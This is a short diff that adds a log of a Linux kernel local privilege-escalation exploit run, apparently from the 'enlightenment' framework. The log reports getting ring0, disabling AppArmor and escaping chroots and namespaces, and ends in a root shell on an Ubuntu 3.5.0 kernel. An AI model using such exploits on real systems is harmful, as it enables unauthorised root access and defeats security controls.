@@ -1,0 +1,14 @@
+ [!] Array base is 0xc1a57a60
+ [!] Detected structure size of 12 bytes
+ [!] Targeting 0xc1a69b10
+ [+] Got ring0!
+ [+] Detected 2.6/3.x style 8k stacks, with current at 0xf1f2cc20 and cred support
+ [+] Disabled security of : AppArmor LSM
+ [+] Found ->fs offset at 0x388
+ [+] Broke out of any chroots or mnt namespaces
+ [+] Got root!
+root@ubuntu:/home/spender/enlightenment#id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/home/spender/enlightenment#uname -a
+Linux ubuntu 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux
+
